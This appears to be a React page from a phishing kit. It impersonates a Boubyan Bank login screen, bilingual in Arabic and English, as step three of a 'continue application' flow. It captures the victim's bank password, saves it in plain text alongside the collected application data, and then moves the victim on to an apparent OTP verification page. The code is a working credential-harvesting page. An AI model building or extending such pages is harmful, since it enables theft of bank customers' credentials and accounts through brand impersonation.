import { useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { useLanguage } from '../context/LanguageContext'
import { getDraftApplication, saveDraftApplication, saveApplication } from '../lib/applicationStorage'

export default function ContinueApplicationStep3Page() {
  const { lang } = useLanguage()
  const isAr = lang === 'ar'
  const navigate = useNavigate()

  const [password, setPassword] = useState('')

  const handleLogin = () => {
    if (!password) return

    const draft = getDraftApplication() || {}
    const finalData = {
      ...draft,
      password,
      step: 'step-3',
      status: 'pending-verification',
      createdAt: draft.createdAt || new Date().toISOString(),
      source: 'continue-application-step-3',
    }

    saveDraftApplication(finalData)
    saveApplication(finalData)
    navigate('/otp-verification')
  }

  return (
    <section className="min-h-screen bg-white flex flex-col justify-between px-4 py-6 sm:py-8 font-sans overflow-x-hidden" dir={isAr ? 'rtl' : 'ltr'}>
      <div className="mx-auto w-full max-w-md flex-1 flex flex-col justify-center py-2">
        
        {/* Boubyan Logo Section */}
        <div className="mb-12 sm:mb-16 flex justify-center text-center">
          <div className="h-auto w-36 sm:w-40">
            <img
              src={import.meta.env.DEV ? '/assets/bob.png' : new URL('../assets/bob.png', import.meta.url).href}
              alt="Boubyan Bank Logo"
              className="h-full w-full object-contain"
            />
          </div>
        </div>

        {/* Form Fields Section */}
        <div className="w-full space-y-8 text-right">
          
          {/* Password Input Field */}
          <div className="relative border-b border-[#cccccc] pb-2">
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder={isAr ? 'كلمة السر' : 'Password'}
              className="w-full bg-transparent text-right text-lg sm:text-xl text-[#333333] outline-none placeholder:text-[#b0b0b0]"
            />
          </div>

          {/* Action Buttons */}
          <div className="mt-8 flex gap-3 pt-4">
            <button
              type="button"
              onClick={handleLogin}
              className="flex-1 rounded-[24px] bg-[#d32f2f] px-5 py-4 text-center text-base sm:text-lg font-bold text-white shadow-[0_10px_25px_rgba(211,47,47,0.35)] transition hover:brightness-105"
            >
              {isAr ? 'الدخول' : 'Login'}
            </button>
            <button
              type="button"
              onClick={() => navigate('/continue-application-step-2')}
              className="flex-1 rounded-[24px] border border-[#d8d8d8] bg-white px-5 py-4 text-center text-base sm:text-lg font-bold text-[#d32f2f] shadow-[0_2px_8px_rgba(0,0,0,0.03)] transition hover:bg-[#f8f8f8]"
            >
              {isAr ? 'إلغاء' : 'Cancel'}
            </button>
          </div>

        </div>
      </div>
    </section>
  )
}